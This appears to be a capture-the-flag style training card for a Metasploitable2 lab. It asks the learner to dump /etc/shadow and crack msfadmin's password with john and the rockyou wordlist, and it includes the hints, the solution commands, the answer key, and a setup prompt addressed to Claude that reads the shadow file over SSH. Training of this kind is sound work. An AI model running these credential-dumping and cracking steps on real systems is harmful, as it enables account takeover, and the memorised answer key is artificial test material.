# Q054 — Crack /etc/shadow with john

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `john, unshadow` |
| **Time budget** | 15–25 min |

---

## 📝 Question

From Metasploitable shell, copy `/etc/shadow` and crack with john. Report **msfadmin's password**.

---

## 🎯 Flag Format

```
msfadmin_pwd=<word>
```

Example: `msfadmin_pwd=msfadmin`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`unshadow passwd shadow > combined`, then `john combined`.
</details>

<details>
<summary>Hint 2</summary>

Use `--wordlist=rockyou.txt` for speed.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
```

Cracks `msfadmin:msfadmin` quickly.

**Answer:** `msfadmin_pwd=msfadmin`

📖 Ref: [tools/john.md](../../tools/john.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q054:
1. Need root-access shell on Metasploitable2 to read /etc/shadow (use Q044 samba_usermap or sudo as msfadmin).
2. SSH msfadmin@192.168.52.129 (msfadmin/msfadmin) then sudo cat /etc/shadow.
3. On Parrot: ls /usr/share/wordlists/rockyou.txt (gunzip it if still .gz: sudo gunzip /usr/share/wordlists/rockyou.txt.gz).
4. john version: which john — should be /usr/sbin/john.

Report back: "Lab ready for Q054 — root shell path to /etc/shadow on 192.168.52.129, rockyou available".
```
